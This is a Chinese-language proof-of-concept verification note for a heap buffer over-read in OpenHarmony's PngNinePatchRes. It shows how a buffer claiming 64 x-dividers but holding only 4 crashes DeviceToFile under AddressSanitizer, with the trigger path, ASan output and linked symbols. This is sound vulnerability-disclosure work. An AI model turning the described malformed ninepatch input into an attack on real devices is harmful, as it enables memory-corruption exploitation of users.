## PoC 验证

**方法**: Target-Compile — 编译真实 `png_ninepatch_res.cpp` 为 `.o`，链接 ASan 插桩二进制，通过公共 API `Deserialize` → `DeviceToFile` 触发。

**触发路径**:
```
main → malloc(48)  // sizeof(PngNinePatchRes) + 4*sizeof(int32_t)
     → 设置 numXDivs=64（声称 64 个 dividers，实际只有 4 个）
     → PngNinePatchRes::Deserialize(buffer)
       → Fill9patchOffsets: xDivsOffset = sizeof(PngNinePatchRes) = 32
     → result->DeviceToFile()
       → GetXDivs() = this + 32
       → for i=0..63: xDivs[i] = htonl(xDivs[i])
         → i=4 时越界（buffer 在 byte 48 结束）
         → ASan: heap-buffer-overflow READ of size 4
```

**ASan 输出**:
```
==2785488==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x504000000040
READ of size 4 at 0x504000000040 thread T0
    #0 in OHOS::ImagePlugin::PngNinePatchRes::DeviceToFile()
       png_ninepatch_res.cpp:48
    #1 in main poc_ninepatch_overflow.cpp:63
    #2 in __libc_start_call_main
    #3 in __libc_start_main_impl
0x504000000040 is located 0 bytes after 48-byte region [0x504000000010,0x504000000040)
allocated by thread T0 here:
    #0 in malloc
    #1 in main poc_ninepatch_overflow.cpp:34
SUMMARY: AddressSanitizer: heap-buffer-overflow png_ninepatch_res.cpp:48
         in OHOS::ImagePlugin::PngNinePatchRes::DeviceToFile()
```

**二进制验证** (`nm` 确认链接真实符号):
```
T OHOS::ImagePlugin::PngNinePatchRes::Deserialize(void*)
T OHOS::ImagePlugin::PngNinePatchRes::DeviceToFile()
T OHOS::ImagePlugin::PngNinePatchRes::FileToDevice()
T OHOS::ImagePlugin::PngNinePatchRes::SerializedSize() const
W OHOS::ImagePlugin::PngNinePatchRes::GetXDivs() const
W OHOS::ImagePlugin::PngNinePatchRes::GetYDivs() const
t OHOS::ImagePlugin::Fill9patchOffsets(PngNinePatchRes*)
```

